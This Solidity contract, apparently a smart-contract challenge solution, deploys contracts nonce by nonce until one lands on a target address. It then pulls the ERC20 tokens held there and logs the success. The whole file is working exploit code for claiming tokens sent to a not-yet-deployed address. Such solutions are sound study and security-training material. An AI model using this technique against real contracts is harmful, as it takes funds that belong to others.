// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC20.sol";
import "hardhat/console.sol";
import "./Missile.sol";

contract MissileLauncher {
    constructor(
        uint256 _maxNonce,
        IERC20 _token,
        address _targetAddr
    ) {
        for (uint256 nonce = 1; nonce <= _maxNonce; nonce++) {
            Missile missile = new Missile();

            if (address(missile) == _targetAddr) {
                missile.transferTokens(_token);
                console.log(
                    "[+] TOKENS TRANSFERRED\nMissileLauncher: %s\nMissileLauncher nonce: %s",
                    address(this),
                    nonce
                );
                return;
            }
        }
    }
}
